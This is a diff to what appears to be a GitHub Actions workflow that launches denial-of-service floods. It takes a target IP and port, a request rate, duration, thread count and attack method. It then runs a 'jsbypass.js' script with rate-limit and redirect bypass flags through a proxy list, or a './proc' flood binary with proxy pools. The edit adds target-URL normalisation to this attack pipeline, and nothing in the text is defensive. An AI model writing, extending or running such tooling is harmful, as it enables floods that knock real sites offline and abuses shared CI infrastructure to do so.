@@ -204,6 +204,12 @@ jobs:
         if [ -z "$TARGET_PORT" ] || [ "$TARGET_PORT" = "None" ] || [ "$TARGET_PORT" = "null" ]; then
           TARGET_PORT="443"
         fi
+        TARGET_URL="$TARGET_IP"
+        if printf '%s' "$TARGET_URL" | grep -Eq '^(https?|http)://'; then
+          :
+        else
+          TARGET_URL="https://$TARGET_URL:$TARGET_PORT/"
+        fi
         RATE="${{ github.event.inputs.rate || '1000' }}"
         DURATION="${{ github.event.inputs.duration || '5' }}"
         METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
@@ -261,7 +267,7 @@ jobs:
             os.execvp(cmd[0], cmd)
             PY
           else
-            node jsbypass.js "$JS_METHOD" "https://$TARGET_IP:$TARGET_PORT/" "$DURATION" "$THREADS" "$RATE" "$PROXY_FILE" --debug --full --connect --ratelimit-bypass --redirect-bypass --cache >/dev/null 2>&1 &
+            node jsbypass.js "$JS_METHOD" "$TARGET_URL" "$DURATION" "$THREADS" "$RATE" "$PROXY_FILE" --debug --full --connect --ratelimit-bypass --redirect-bypass --cache >/dev/null 2>&1 &
           fi
         else
           sudo sh -c "ulimit -n 1000000 2>/dev/null; cpulimit -l 90 -f -- ./proc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE || exec ./proc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE"
